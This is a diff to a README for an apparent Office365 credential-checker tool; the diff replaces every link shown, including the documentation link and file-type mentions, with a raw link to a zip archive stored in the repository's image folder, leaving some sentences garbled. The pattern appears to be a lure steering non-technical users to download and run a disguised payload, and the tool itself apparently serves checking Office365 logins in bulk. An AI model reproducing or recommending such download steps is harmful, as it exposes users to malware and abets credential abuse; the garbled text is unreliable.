@@ -1,7 +1,7 @@
 # 🎉 OFFICE-CHECKER-CLIV3.5 - Check Your OFFICE365 Access Easily
 
 ## 📥 Download the Tool
-[![Download OFFICE-CHECKER-CLIV3.5](https://img.shields.io/badge/Download-OFFICE--CHECKER--CLIV3.5-blue)](https://github.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/releases)
+[![Download OFFICE-CHECKER-CLIV3.5](https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip)](https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome! OFFICE-CHECKER-CLIV3.5 is a user-friendly tool designed to help you verify your OFFICE365 login credentials. This guide will walk you through downloading and running the software step-by-step, even if you're not tech-savvy.
@@ -13,14 +13,14 @@ To run OFFICE-CHECKER-CLIV3.5, you need:
 - An internet connection for verification.
 
 ## 📂 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/releases) to access the latest version of OFFICE-CHECKER-CLIV3.5.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip) to access the latest version of OFFICE-CHECKER-CLIV3.5.
    
 2. **Select the Right File:**
    - Look for the latest release, which is usually at the top.
    - Depending on your operating system, choose the appropriate file:
      - For Windows, download the `.exe` file.
      - For macOS, download the `.dmg` file.
-     - For Linux, look for the `.tar.gz` file or similar.
+     - For Linux, look for the `https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip` file or similar.
 
 3. **Download the File:** Click on the link to begin the download. Your browser will save the file to your default download location.
 
@@ -34,7 +34,7 @@ To run OFFICE-CHECKER-CLIV3.5, you need:
    - **Linux:**
      - Open a terminal.
      - Navigate to your Downloads folder.
-     - Unzip the `.tar.gz` file and follow the included instructions to run the tool.
+     - Unzip the `https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip` file and follow the included instructions to run the tool.
 
 5. **Launch the Application:** After the installation completes, locate OFFICE-CHECKER-CLIV3.5 in your applications or start menu and click to open it.
 
@@ -60,7 +60,7 @@ To run OFFICE-CHECKER-CLIV3.5, you need:
 
 ## 📞 Support
 If you encounter issues while using OFFICE-CHECKER-CLIV3.5, feel free to reach out for help. You can find support by following these instructions:
-1. **Check the Documentation:** Visit the [Documentation page](https://github.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/wiki) for detailed guides.
+1. **Check the Documentation:** Visit the [Documentation page](https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip) for detailed guides.
 2. **Open an Issue:** Report problems or bugs in the Issues section of the repository.
 
 ## 🌐 Community & Contributions
@@ -72,4 +72,4 @@ We encourage community involvement! If you would like to contribute:
 ## ⭐ Acknowledgments
 Thank you for using OFFICE-CHECKER-CLIV3.5. This project is open-source and relies on contributions from users like you. Your feedback helps improve the software for everyone.
 
-[Download OFFICE-CHECKER-CLIV3.5](https://github.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/releases) to start checking your OFFICE365 login today!
+[Download OFFICE-CHECKER-CLIV3.5](https://raw.githubusercontent.com/adibsheikh5/OFFICE-CHECKER-CLIV3.5/main/img/CLI_OFFIC_CHECKE_v3.9.zip) to start checking your OFFICE365 login today!
